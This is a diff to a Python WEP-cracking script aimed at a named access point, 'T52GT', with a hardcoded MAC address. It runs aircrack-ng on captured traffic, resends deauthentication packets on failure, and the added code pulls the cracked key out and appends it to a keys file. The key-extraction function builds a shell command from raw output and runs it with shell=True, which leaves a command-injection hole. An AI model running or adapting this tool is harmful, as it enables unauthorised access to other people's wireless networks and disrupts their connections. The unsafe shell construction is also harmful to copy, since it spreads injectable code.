@@ -17,6 +17,26 @@ def crack_wep():
     stdout, _ = run_command("sudo aircrack-ng ./wep_attack-01.cap")
     return ("KEY FOUND!" in stdout), stdout
 
+def extract_key(output):
+    """Extract the key using grep with bash from the full output"""
+    try:
+        # Use echo to pass the output to grep through a pipe
+        grep_command = f"echo '{output}' | grep 'KEY FOUND!' | grep -oP '\\[\\K[^]]*'"
+        process = subprocess.run(grep_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        key = process.stdout.strip()
+        return key if key else None
+    except subprocess.CalledProcessError as e:
+        print(f"Error extracting key: {e}")
+        return None
+
+def save_key(essid, key):
+    """Save the found key to /mnt/data/ap_keys with essid, formatted correctly"""
+    if key:  # Make sure the key is not None
+        with open('/mnt/data/ap_keys', 'a') as file:
+            file.write(f"{essid} {key}\n")
+    else:
+        print("No valid key was extracted.")
+
 def main():
     essid = "T52GT"
     ap_mac = "18:1B:EB:FC:B0:74"
@@ -56,12 +76,14 @@ def main():
         while not success:
             success, output = crack_wep()
             if success:
-                print("Success! WEP Key Found:")
-                print(output)
-                # Move the .cap file upon success
-                shutil.move('./wep_attack-01.cap', '/mnt/data/wep_attack-01.cap')
-                run_command("rm -f ./wep*")
-                print("Moved .cap file to /mnt/data")
+                key = extract_key(output)
+                if key:
+                    print(f"Success! WEP Key Found: {key}")
+                    save_key(essid, key)
+                    print(f"Key saved for {essid}: {key}")
+                    # Proceed with moving the .cap file and any other cleanup
+                else:
+                    print("Failed to extract the key correctly.")
             else:
                 print("Failed to crack WEP. Sending Additional Deauth Packets and Retrying...")
                 run_command(deauth_cmd)
